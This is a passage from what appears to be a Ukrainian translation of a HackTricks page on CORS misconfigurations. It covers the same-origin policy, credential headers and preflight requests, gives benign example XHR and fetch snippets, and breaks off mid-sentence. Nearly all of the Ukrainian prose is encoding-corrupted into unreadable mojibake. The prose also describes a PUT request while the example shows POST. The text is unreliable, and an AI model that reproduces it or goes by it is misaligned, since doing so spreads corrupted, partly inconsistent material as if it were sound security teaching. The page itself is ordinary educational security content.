# CORS - –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ç–∞ –æ–±—Ö—ñ–¥

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## –©–æ —Ç–∞–∫–µ CORS?

–°—Ç–∞–Ω–¥–∞—Ä—Ç Cross-Origin Resource Sharing (CORS) **–¥–æ–∑–≤–æ–ª—è—î —Å–µ—Ä–≤–µ—Ä–∞–º –≤–∏–∑–Ω–∞—á–∞—Ç–∏, —Ö—Ç–æ –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —ó—Ö–Ω—ñ—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤** —Ç–∞ **—è–∫—ñ –º–µ—Ç–æ–¥–∏ HTTP –∑–∞–ø–∏—Ç—ñ–≤ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ** –∑ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –¥–∂–µ—Ä–µ–ª.

–ü–æ–ª—ñ—Ç–∏–∫–∞ **–æ–¥–Ω–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è** –≤–∏–º–∞–≥–∞—î, —â–æ–± **—Å–µ—Ä–≤–µ—Ä, —â–æ –∑–∞–ø–∏—Ç—É—î** —Ä–µ—Å—É—Ä—Å, —ñ —Å–µ—Ä–≤–µ—Ä, —â–æ —Ö–æ—Å—Ç–∏—Ç—å **—Ä–µ—Å—É—Ä—Å**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏ –æ–¥–∏–Ω —ñ —Ç–æ–π –∂–µ –ø—Ä–æ—Ç–æ–∫–æ–ª (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `http://`), –¥–æ–º–µ–Ω–Ω–µ —ñ–º'—è (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `internal-web.com`) —Ç–∞ **–ø–æ—Ä—Ç** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, 80). –ó–≥—ñ–¥–Ω–æ –∑ —Ü—ñ—î—é –ø–æ–ª—ñ—Ç–∏–∫–æ—é, –ª–∏—à–µ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑ –æ–¥–Ω–æ–≥–æ –¥–æ–º–µ–Ω—É —Ç–∞ –ø–æ—Ä—Ç—É –º–∞—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤.

–ó–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è –ø–æ–ª—ñ—Ç–∏–∫–∏ –æ–¥–Ω–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ `http://normal-website.com/example/example.html` —ñ–ª—é—Å—Ç—Ä—É—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:

| URL, –¥–æ —è–∫–æ–≥–æ –∑–≤–µ—Ä—Ç–∞—é—Ç—å—Å—è                              | –î–æ—Å—Ç—É–ø –¥–æ–∑–≤–æ–ª–µ–Ω–æ?                       |
| ----------------------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`                  | –¢–∞–∫: –Ü–¥–µ–Ω—Ç–∏—á–Ω–∞ —Å—Ö–µ–º–∞, –¥–æ–º–µ–Ω —Ç–∞ –ø–æ—Ä—Ç    |
| `http://normal-website.com/example2/`                 | –¢–∞–∫: –Ü–¥–µ–Ω—Ç–∏—á–Ω–∞ —Å—Ö–µ–º–∞, –¥–æ–º–µ–Ω —Ç–∞ –ø–æ—Ä—Ç    |
| `https://normal-website.com/example/`                 | –ù—ñ: –†—ñ–∑–Ω–∞ —Å—Ö–µ–º–∞ —Ç–∞ –ø–æ—Ä—Ç                 |
| `http://en.normal-website.com/example/`               | –ù—ñ: –†—ñ–∑–Ω–µ –¥–æ–º–µ–Ω–Ω–µ —ñ–º'—è                 |
| `http://www.normal-website.com/example/`              | –ù—ñ: –†—ñ–∑–Ω–µ –¥–æ–º–µ–Ω–Ω–µ —ñ–º'—è                 |
| `http://normal-website.com:8080/example/`             | –ù—ñ: –†—ñ–∑–Ω–∏–π –ø–æ—Ä—Ç\*                       |

\*Internet Explorer —ñ–≥–Ω–æ—Ä—É—î –Ω–æ–º–µ—Ä –ø–æ—Ä—Ç—É –ø—Ä–∏ –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ –æ–¥–Ω–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î —Ü–µ–π –¥–æ—Å—Ç—É–ø.

### –ó–∞–≥–æ–ª–æ–≤–æ–∫ `Access-Control-Allow-Origin`

–¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª—è—Ç–∏ **–¥–µ–∫—ñ–ª—å–∫–∞ –ø–æ—Ö–æ–¥–∂–µ–Ω—å**, –∑–Ω–∞—á–µ–Ω–Ω—è **`null`** –∞–±–æ –ø—ñ–¥—Å—Ç–∞–Ω–æ–≤–æ—á–Ω–∏–π –∑–Ω–∞–∫ **`*`**. –û–¥–Ω–∞–∫ **–∂–æ–¥–µ–Ω –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î –¥–µ–∫—ñ–ª—å–∫–∞ –ø–æ—Ö–æ–¥–∂–µ–Ω—å**, –∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø—ñ–¥—Å—Ç–∞–Ω–æ–≤–æ—á–Ω–æ–≥–æ –∑–Ω–∞–∫–∞ `*` –ø—ñ–¥–ª—è–≥–∞—î **–æ–±–º–µ–∂–µ–Ω–Ω—è–º**. (–ü—ñ–¥—Å—Ç–∞–Ω–æ–≤–∫–æ–≤–∏–π –∑–Ω–∞–∫ –ø–æ–≤–∏–Ω–µ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –æ–∫—Ä–µ–º–æ, —ñ –π–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä–∞–∑–æ–º –∑ `Access-Control-Allow-Credentials: true` –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ.)

–¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ **–≤–∏–¥–∞—î—Ç—å—Å—è —Å–µ—Ä–≤–µ—Ä–æ–º** —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –∑–∞–ø–∏—Ç —Ä–µ—Å—É—Ä—Å—É –∑ —ñ–Ω—à–æ–≥–æ –¥–æ–º–µ–Ω—É, —ñ–Ω—ñ—Ü—ñ–π–æ–≤–∞–Ω–∏–π –≤–µ–±-—Å–∞–π—Ç–æ–º, –ø—Ä–∏ —Ü—å–æ–º—É –±—Ä–∞—É–∑–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –¥–æ–¥–∞—î –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Origin`.

### –ó–∞–≥–æ–ª–æ–≤–æ–∫ `Access-Control-Allow-Credentials`

–ó–∞ **–∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º** –∑–∞–ø–∏—Ç–∏ –∑ —ñ–Ω—à–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –∑–¥—ñ–π—Å–Ω—é—é—Ç—å—Å—è –±–µ–∑ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, —Ç–∞–∫–∏—Ö —è–∫ –∫—É–∫–∏ –∞–±–æ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó. –ü—Ä–æ—Ç–µ —Å–µ—Ä–≤–µ—Ä –∑ —ñ–Ω—à–æ–≥–æ –¥–æ–º–µ–Ω—É –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ —á–∏—Ç–∞–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, –∫–æ–ª–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Access-Control-Allow-Credentials` –Ω–∞ **`true`**.

–Ø–∫—â–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `true`, –±—Ä–∞—É–∑–µ—Ä –ø–µ—Ä–µ–¥–∞–≤–∞—Ç–∏–º–µ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ (–∫—É–∫–∏, –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –∞–±–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –∫–ª—ñ—î–Ω—Ç–∞ TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-flight request

### Understanding Pre-flight Requests in Cross-Domain Communication

–ö–æ–ª–∏ —ñ–Ω—ñ—Ü—ñ—é—î—Ç—å—Å—è –∑–∞–ø–∏—Ç –º—ñ–∂ –¥–æ–º–µ–Ω–∞–º–∏ –∑–∞ –ø–µ–≤–Ω–∏—Ö —É–º–æ–≤, —Ç–∞–∫–∏—Ö —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **–Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–≥–æ HTTP-–º–µ—Ç–æ–¥—É** (–±—É–¥—å-—è–∫–æ–≥–æ, –æ–∫—Ä—ñ–º HEAD, GET, POST), –≤–≤–µ–¥–µ–Ω–Ω—è –Ω–æ–≤–∏—Ö **–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤** –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ–≥–æ **–∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ Content-Type**, –º–æ–∂–µ –∑–Ω–∞–¥–æ–±–∏—Ç–∏—Å—è –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∑–∞–ø–∏—Ç. –¶–µ–π –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∑–∞–ø–∏—Ç, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –º–µ—Ç–æ–¥ **`OPTIONS`**, —Å–ª—É–∂–∏—Ç—å –¥–ª—è —ñ–Ω—Ñ–æ—Ä–º—É–≤–∞–Ω–Ω—è —Å–µ—Ä–≤–µ—Ä–∞ –ø—Ä–æ –Ω–∞–º—ñ—Ä–∏ –º–∞–π–±—É—Ç–Ω—å–æ–≥–æ –∑–∞–ø–∏—Ç—É –∑ —ñ–Ω—à–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, –≤–∫–ª—é—á–∞—é—á–∏ HTTP-–º–µ—Ç–æ–¥–∏ —Ç–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏, —è–∫—ñ –≤—ñ–Ω –º–∞—î –Ω–∞–º—ñ—Ä –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏.

–ü—Ä–æ—Ç–æ–∫–æ–ª **Cross-Origin Resource Sharing (CORS)** –≤–∏–º–∞–≥–∞—î —Ü—å–æ–≥–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —â–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–∞–ø–∏—Ç—É–≤–∞–Ω–æ—ó –æ–ø–µ—Ä–∞—Ü—ñ—ó –∑ —ñ–Ω—à–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –º–µ—Ç–æ–¥–∏, –∑–∞–≥–æ–ª–æ–≤–∫–∏ —Ç–∞ –Ω–∞–¥—ñ–π–Ω—ñ—Å—Ç—å –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è. –î–ª—è –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ —Ä–æ–∑—É–º—ñ–Ω–Ω—è —É–º–æ–≤, —è–∫—ñ –æ–±—Ö–æ–¥—è—Ç—å –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∑–∞–ø–∏—Ç—É, –∑–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –≤—Å–µ–±—ñ—á–Ω–æ–≥–æ –ø–æ—Å—ñ–±–Ω–∏–∫–∞, –Ω–∞–¥–∞–Ω–æ–≥–æ [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

–í–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ **–≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∑–∞–ø–∏—Ç—É –Ω–µ —Å–∫–∞—Å–æ–≤—É—î –≤–∏–º–æ–≥—É, —â–æ–± –≤—ñ–¥–ø–æ–≤—ñ–¥—å –º—ñ—Å—Ç–∏–ª–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó**. –ë–µ–∑ —Ü–∏—Ö –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ –±—Ä–∞—É–∑–µ—Ä –Ω–µ –∑–¥–∞—Ç–Ω–∏–π –æ–±—Ä–æ–±–∏—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –∑–∞–ø–∏—Ç –∑ —ñ–Ω—à–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è.

–†–æ–∑–≥–ª—è–Ω—å—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —ñ–ª—é—Å—Ç—Ä–∞—Ü—ñ—é –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∑–∞–ø–∏—Ç—É, —Å–ø—Ä—è–º–æ–≤–∞–Ω–æ–≥–æ –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ç–æ–¥—É `PUT` —Ä–∞–∑–æ–º —ñ–∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–º –∑–∞–≥–æ–ª–æ–≤–∫–æ–º –ø—ñ–¥ –Ω–∞–∑–≤–æ—é `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
–£ –≤—ñ–¥–ø–æ–≤—ñ–¥—å —Å–µ—Ä–≤–µ—Ä –º–æ–∂–µ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∏, —â–æ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –ø—Ä–∏–π–Ω—è—Ç—ñ –º–µ—Ç–æ–¥–∏, –¥–æ–∑–≤–æ–ª–µ–Ω–∏–π –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è —Ç–∞ —ñ–Ω—à—ñ –¥–µ—Ç–∞–ª—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ CORS, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂—á–µ:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤–∫–∞–∑—É—î, —è–∫—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –ø—ñ–¥ —á–∞—Å —Ñ–∞–∫—Ç–∏—á–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É. –í—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è —Å–µ—Ä–≤–µ—Ä–æ–º, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –≤ –∑–∞–ø–∏—Ç–∞—Ö –≤—ñ–¥ –∫–ª—ñ—î–Ω—Ç–∞.
* **`Access-Control-Expose-Headers`**: –ß–µ—Ä–µ–∑ —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ —Å–µ—Ä–≤–µ—Ä —ñ–Ω—Ñ–æ—Ä–º—É—î –∫–ª—ñ—î–Ω—Ç–∞ –ø—Ä–æ —Ç–µ, —è–∫—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç—ñ —è–∫ —á–∞—Å—Ç–∏–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, –∫—Ä—ñ–º –ø—Ä–æ—Å—Ç–∏—Ö –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.
* **`Access-Control-Max-Age`**: –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤–∫–∞–∑—É—î, —è–∫ –¥–æ–≤–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∑–∞–ø–∏—Ç—É –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∫–µ—à–æ–≤–∞–Ω—ñ. –°–µ—Ä–≤–µ—Ä –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∏–π —á–∞—Å, –≤ —Å–µ–∫—É–Ω–¥–∞—Ö, –ø—Ä–æ—Ç—è–≥–æ–º —è–∫–æ–≥–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è, –ø–æ–≤–µ—Ä–Ω–µ–Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º –∑–∞–ø–∏—Ç–æ–º, –º–æ–∂–µ –±—É—Ç–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞.
* **`Access-Control-Request-Headers`**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –∑–∞–ø–∏—Ç–∞—Ö, —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∫–ª—ñ—î–Ω—Ç–æ–º, —â–æ–± –ø—Ä–æ—ñ–Ω—Ñ–æ—Ä–º—É–≤–∞—Ç–∏ —Å–µ—Ä–≤–µ—Ä –ø—Ä–æ —Ç–µ, —è–∫—ñ HTTP –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∫–ª—ñ—î–Ω—Ç —Ö–æ—á–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤ —Ñ–∞–∫—Ç–∏—á–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ.
* **`Access-Control-Request-Method`**: –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫, —Ç–∞–∫–æ–∂ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –∑–∞–ø–∏—Ç–∞—Ö, –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∫–ª—ñ—î–Ω—Ç–æ–º, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏, —è–∫–∏–π HTTP –º–µ—Ç–æ–¥ –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –≤ —Ñ–∞–∫—Ç–∏—á–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ.
* **`Origin`**: –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º —ñ –≤–∫–∞–∑—É—î –Ω–∞ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –∑–∞–ø–∏—Ç—É –∑ —ñ–Ω—à–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞. –í—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Å–µ—Ä–≤–µ—Ä–æ–º –¥–ª—è –æ—Ü—ñ–Ω–∫–∏ —Ç–æ–≥–æ, —á–∏ —Å–ª—ñ–¥ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∞–±–æ –≤—ñ–¥—Ö–∏–ª–∏—Ç–∏ –≤—Ö—ñ–¥–Ω–∏–π –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ CORS.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–∞–∑–≤–∏—á–∞–π (–≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Ç–∏–ø—É –≤–º—ñ—Å—Ç—É —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—Ö –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤) —É **GET/POST –∑–∞–ø–∏—Ç—ñ –Ω–µ –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∑–∞–ø–∏—Ç** (–∑–∞–ø–∏—Ç –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è **–±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ**), –∞–ª–µ —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤/—Ç—ñ–ª–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ**, –≤—ñ–Ω –ø–æ–≤–∏–Ω–µ–Ω –º—ñ—Å—Ç–∏—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ _Access-Control-Allow-Origin_, —â–æ –¥–æ–∑–≤–æ–ª—è—î —Ü–µ.\
**–û—Ç–∂–µ, CORS –Ω–µ –∑–∞—Ö–∏—â–∞—î –≤—ñ–¥ CSRF (–∞–ª–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º).**

### **–ó–∞–ø–∏—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ –ü–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∑–∞–ø–∏—Ç**

1. **`Access-Control-Request-Local-Network`**: –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤–∫–ª—é—á–∞—î—Ç—å—Å—è –≤ –∑–∞–ø–∏—Ç –∫–ª—ñ—î–Ω—Ç–∞, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏, —â–æ –∑–∞–ø–∏—Ç —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –Ω–∞ —Ä–µ—Å—É—Ä—Å –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ. –í—ñ–Ω —Å–ª—É–≥—É—î –º–∞—Ä–∫–µ—Ä–æ–º, —â–æ–± –ø—Ä–æ—ñ–Ω—Ñ–æ—Ä–º—É–≤–∞—Ç–∏ —Å–µ—Ä–≤–µ—Ä –ø—Ä–æ —Ç–µ, —â–æ –∑–∞–ø–∏—Ç –ø–æ—Ö–æ–¥–∏—Ç—å –∑ –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ.
2. **`Access-Control-Allow-Local-Network`**: –£ –≤—ñ–¥–ø–æ–≤—ñ–¥—å —Å–µ—Ä–≤–µ—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫, —â–æ–± –ø–æ–≤—ñ–¥–æ–º–∏—Ç–∏, —â–æ –∑–∞–ø–∏—Ç—É–≤–∞–Ω–∏–π —Ä–µ—Å—É—Ä—Å –¥–æ–∑–≤–æ–ª–µ–Ω–æ –¥—ñ–ª–∏—Ç–∏—Å—è –∑ —Å—É–±'—î–∫—Ç–∞–º–∏ –∑–∞ –º–µ–∂–∞–º–∏ –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ. –í—ñ–Ω –¥—ñ—î —è–∫ –∑–µ–ª–µ–Ω–∞ –ª–∞–º–ø–æ—á–∫–∞ –¥–ª—è –æ–±–º—ñ–Ω—É —Ä–µ—Å—É—Ä—Å–∞–º–∏ —á–µ—Ä–µ–∑ —Ä—ñ–∑–Ω—ñ –º–µ—Ä–µ–∂–µ–≤—ñ –º–µ–∂—ñ, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –ø—Ä–∏ –¥–æ—Ç—Ä–∏–º–∞–Ω–Ω—ñ 